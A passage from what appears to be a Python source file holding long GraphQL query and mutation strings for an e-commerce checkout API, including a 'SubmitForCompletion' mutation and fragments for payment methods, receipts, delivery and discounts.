__typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone 